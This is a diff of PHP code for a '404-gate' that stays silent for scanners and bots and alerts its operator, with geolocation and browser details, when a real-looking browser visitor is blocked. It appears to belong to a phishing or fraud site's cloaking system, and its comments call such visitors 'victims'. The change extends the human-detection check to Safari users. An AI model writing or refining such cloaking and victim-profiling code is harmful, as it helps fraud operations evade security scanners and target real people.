@@ -393,10 +393,12 @@ function geo(string $ip): array {
 // -------------------------------------------------- silent 404
 function forensics_404(): void {
     if (isset($_GET['hp'])) return;                 // scanners, not humans
-    // Bots/probers (spoofed UA, no client-hint/fetch headers) are the norm —
-    // stay silent for them. Only alert when the blocked request looks like a
-    // real browser (a potential human/victim we lost).
-    $looksHuman = req_header('Sec-Ch-Ua') !== ''
+    // Bots/probers are the norm — stay silent for them. Only alert when the
+    // blocked request looks like a real browser (a potential human/victim we
+    // lost). Safari never sends Sec-Ch-Ua, so the signature is: real-browser
+    // UA + Sec-Fetch-Mode + Accept + Accept-Language.
+    $ua  = ua();
+    $looksHuman = (stripos($ua, 'AppleWebKit') !== false)
         && req_header('Sec-Fetch-Mode') !== ''
         && req_header('Accept') !== ''
         && req_header('Accept-Language') !== '';
@@ -411,7 +413,7 @@ function forensics_404(): void {
         '🔍 404-gate: possible human blocked',
         '📍 ' . ip() . ' — ' . $g['city'] . ', ' . $g['country'] . ' (' . $g['isp'] . ')',
         '📄 ' . (string)($_SERVER['REQUEST_URI'] ?? ''),
-        '🖥 ' . mb_substr(ua(), 0, 120),
+        '🖥 ' . mb_substr($ua, 0, 120),
     ];
     if (req_header('Referer') !== '') {
         $lines[] = '🔗 ' . mb_substr(req_header('Referer'), 0, 120);
